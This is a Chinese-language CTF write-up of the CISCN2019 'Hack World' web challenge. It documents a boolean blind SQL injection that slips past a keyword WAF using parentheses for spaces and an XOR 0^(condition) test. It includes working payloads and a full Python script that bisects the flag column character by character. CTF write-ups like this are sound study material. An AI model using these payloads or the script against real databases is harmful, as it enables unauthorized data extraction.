---
title: CISCN2019 - Web - Hack World
date: 2026-11-14 18:08:00
categories:
  - CTF
  - CISCN2019
  - Web
tags:
  - 布尔盲注
  - 异或注入
  - 括号绕过空格
  - WAF绕过
  - 二分爆破
cover: /img/cover/rainy-night-white-hair-girl.jpg
description: SQL 布尔盲注题，WAF 只拦带空格的 and/or/union，用异或 ^ 做布尔判断、括号代替空格构造 0^(条件) 结构，用 substr+ascii 二分逐位爆破 flag 表 flag 列拿 flag。
keywords:
  - 布尔盲注
  - 异或注入
  - WAF绕过
  - 二分法
  - CISCN
ai: >-
  本题是 CISCN2019 华北赛区 Day2 的 Web 题，首页提示 flag 位于 flag 表的 flag 列，通过 POST 参数 id 查询。WAF 拦截带空格的 and、or、union 及 information_schema。探测发现异或 ^、括号及不带空格的 select、substr、ascii 仍可用，于是用括号替代空格、用 0^(条件) 做布尔判断：真时 0^1=1 返回 Hello，假时 0^0=0 返回 Error。据此构造 length 判断长度，再用 ascii(substr(...)) 二分爆破逐位求出 flag。考察 WAF 过滤粒度与无空格布尔盲注构造。
copyright_author: Hunter
---

> 结论先行：WAF 只拦「带空格的关键字」；用括号代替空格、`^` 异或做布尔判断，构造 `0^(条件)` 对 `flag` 表 `flag` 列做 `substr`+`ascii` 二分盲注。

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | CISCN2019 |
| 方向 | Web |
| 难度 | Easy |
| 环境 | 授权靶场（已脱敏） |

漏洞类型：SQL 布尔盲注（异或 `^` + `if` 绕过 + 括号代替空格）。

## 信息收集

首页提示：

```text
All You Want Is In Table 'flag' and the column is 'flag'
Now, just give the id of passage
```

表单 POST 参数 `id`，后端 SQL 形如 `SELECT ... FROM passage WHERE id=<input>`，但存在 WAF 过滤。

### 探测结果

| 输入 | 响应 |
|------|------|
| `1` | `Hello, glzjin wants a girlfriend.`（真） |
| `0` / `999` | `Error Occured When Fetch Result.`（假） |
| `1 and 1=1` | `SQL Injection Checked`（被拦截） |
| `1 or 1=1` | `SQL Injection Checked`（被拦截） |
| `1 union select 1` | `SQL Injection Checked`（被拦截） |
| `1^1` | `Error`（异或可用，1^1=0） |
| `1=1` | `Hello`（`=` 可用） |
| `0^(1)` | `Hello`（括号+异或可用） |

### 过滤规则

- 过滤**带空格的** `and`、`or`、`union` 等关键字（`information_schema` 也被拦截）。
- 但 `^`（异或）、`=`、括号、`select`、`from`、`substr`、`ascii`、`length`、`if` 等**不带空格**时可用。
- **绕过方式：用括号代替空格**，用 `^` 异或代替 `and/or/if` 做布尔判断。

## 漏洞分析

### 布尔盲注结构

```text
0^(条件)
```

- `条件` 为真 → `0^1 = 1` → 返回 `Hello`（真）
- `条件` 为假 → `0^0 = 0` → 返回 `Error`（假）

由于 WAF 只拦「空格+关键字」，把全部空格换成括号后，`select`、`from`、`substr`、`ascii` 等关键字都能通过，而异或本身充当了条件判断，无需 `if`。

## 利用过程

### payload

```sql
-- 判断 flag 长度
0^(length((select(flag)from(flag)))>N)

-- 逐位爆破 flag 字符（ASCII 二分）
0^(ascii(substr((select(flag)from(flag)),pos,1))>N)
```

用括号代替所有空格，绕过 WAF 对 `空格+关键字` 的过滤。

### 爆破结果

flag 长度 42，逐位二分爆破得到 flag。

## 完整 EXP

```python
import urllib.request, urllib.parse, sys

HOST = 'http://target:8080/'  # 授权靶场（已脱敏）

def check(s):
    data = urllib.parse.urlencode({'id': s}).encode()
    req = urllib.request.Request(HOST + 'index.php', data=data, method='POST',
        headers={'User-Agent': 'Mozilla/5.0'})
    return b'Hello' in urllib.request.urlopen(req, timeout=20).read()

# 二分求 flag 长度
lo, hi = 1, 100
while lo < hi:
    mid = (lo + hi) // 2
    if check(f"0^(length((select(flag)from(flag)))>{mid})"):
        lo = mid + 1
    else:
        hi = mid
L = lo
print('len:', L)

flag = ''
for pos in range(1, L + 1):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if check(f"0^(ascii(substr((select(flag)from(flag)),{pos},1))>{mid})"):
            lo = mid + 1
        else:
            hi = mid
    flag += chr(lo)
    sys.stdout.write('\r' + flag)
    sys.stdout.flush()

print('\nFLAG =', flag)
```

## Flag

```text
flag{xxxx}
```

## 踩坑与总结

1. WAF 只过滤带空格的 `and`/`or`/`union`，用括号代替空格绕过。
2. 用异或 `^` 做布尔判断，`if` 也被过滤但异或天然充当条件判断。
3. `substr` + `ascii` 逐位爆破，二分法加速。
4. flag 长度 42，最终爆破得 flag。
5. 布尔盲注的关键是先建立稳定的「真/假」响应差异（`Hello` / `Error`），再把它套进 `0^(条件)` 结构。
